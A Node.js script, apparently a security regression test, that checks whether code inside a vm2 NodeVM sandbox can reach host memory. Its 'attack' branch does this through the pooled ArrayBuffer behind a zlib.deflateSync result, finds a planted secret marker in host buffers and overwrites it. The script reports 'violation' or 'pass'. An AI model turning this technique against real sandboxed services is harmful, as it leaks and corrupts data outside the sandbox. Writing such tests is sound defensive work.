```js
'use strict';

const { NodeVM } = require('vm2');

const marker = 'VM2_ZLIB_POOL_SECRET_7b31';
const markerCodes = Object.freeze(Array.from(marker, (character) => character.charCodeAt(0)));
const retained = [];

for (let index = 0; index < 192; index += 1) {
  const buffer = Buffer.allocUnsafe(64);
  buffer.fill(0x41);
  const markerOffset = index % (buffer.length - markerCodes.length + 1);
  markerCodes.forEach((byte, byteIndex) => {
    buffer[markerOffset + byteIndex] = byte;
  });
  retained.push({ buffer, markerOffset });
}

const snapshot = () => retained.map(({ buffer }) => Array.from(buffer));
const changed = (before, after) => before.some((bytes, index) =>
  bytes.some((byte, byteIndex) => byte !== after[index][byteIndex]));
const mode = process.argv[2] || 'attack';
const input = process.argv[3] || 'hello';
const before = snapshot();
const vm = new NodeVM({ require: { builtin: ['zlib'] } });

if (mode === 'control') {
  const control = vm.run(`
    const zlib = require('zlib');
    const result = zlib.deflateSync(Buffer.from('hello'));
    const local = Buffer.allocUnsafe(1);
    const view = Buffer.from(local.buffer, 0, local.buffer.byteLength);
    module.exports = {
      route: !!zlib && typeof zlib.deflateSync === 'function'
        && Buffer.isBuffer(result),
      exactSize: local.byteOffset === 0
        && local.buffer.byteLength === local.length
        && view.byteOffset === 0
        && view.length === local.length
        && view.buffer.byteLength === local.length,
    };
  `, 'zlib-buffer-case-a.js');
  const passed = control.route && control.exactSize && !changed(before, snapshot());
  console.log(JSON.stringify({ mode, result: passed ? 'pass' : 'violation' }));
} else {
  const attack = vm.run(`
    const zlib = require('zlib');
    const result = zlib.deflateSync(${JSON.stringify(input)});
    const view = Buffer.from(result.buffer, 0, result.buffer.byteLength);
    const markerCodes = ${JSON.stringify(Array.from(markerCodes))};
    let firstMarker = -1;
    for (let offset = 0; offset <= view.length - markerCodes.length; offset += 1) {
      if (markerCodes.every((byte, byteIndex) => view[offset + byteIndex] === byte)) {
        firstMarker = offset;
        break;
      }
    }
    if (firstMarker >= 0) view[firstMarker] ^= 0xff;
    module.exports = {
      route: !!zlib && typeof zlib.deflateSync === 'function'
        && Buffer.isBuffer(result),
      fullView: view.byteOffset === 0
        && view.length === result.buffer.byteLength
        && view.buffer.byteLength === result.buffer.byteLength,
      poolIsWider: result.buffer.byteLength > result.length,
      markerFound: firstMarker >= 0,
    };
  `, 'zlib-buffer-case-b.js');
  const passed = attack.route && attack.fullView && attack.poolIsWider
    && attack.markerFound && changed(before, snapshot());
  console.log(JSON.stringify({ mode, result: passed ? 'violation' : 'pass' }));
}
```

